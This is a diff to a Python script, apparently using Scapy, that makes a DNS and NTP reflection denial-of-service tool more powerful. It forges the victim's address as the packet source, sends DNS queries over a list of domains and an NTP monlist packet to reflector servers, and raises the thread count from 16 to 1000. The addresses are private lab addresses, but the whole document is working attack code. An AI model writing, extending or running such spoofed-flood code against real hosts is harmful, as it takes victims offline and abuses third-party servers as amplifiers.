@@ -9,16 +9,20 @@ import concurrent.futures
 import sys
 import time
 
+dns_hosts = ["example.com.","www.example.com.","example.org","example.be","example.fr","test.com","a-very-long-domain-name.com","a-very-long-domain-name.org","oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof","i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof","domain.oof"]
+
 
 def dns_ddos(target, dns_server):
+    global dns_hosts
 
-    ip = IP(src=target, dst=dns_server)
-    udp = UDP(dport=53)
-    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="google.com", qtype=225))
+    for host in dns_hosts:
+        ip = IP(src=target, dst=dns_server)
+        udp = UDP(dport=53)
+        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))
 
-    request = (ip/udp/dns)
+        request = (ip/udp/dns)
 
-    send(request)
+        send(request)
 
 def ntp_ddos(target, ntp_server):
     #Magic Packet aka NTP v2 Monlist Packet
@@ -30,14 +34,12 @@ if __name__ == "__main__":
     target = "10.12.0.10"
     dns_server = "10.12.0.20"
     ntp_server = "10.12.0.30"
-    # dns_ddos(target="10.12.0.10", dns_server="10.12.0.20") # target webserver for example
-    # ntp_ddos(target="10.12.0.10", ntp_server="10.12.0.30")
 
     start_time = time.time()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
         futures = []
-        for i in range(16):
+        for i in range(1000):
             if (i % 2 == 0):
                 futures.append(executor.submit(
                     dns_ddos, target, dns_server))
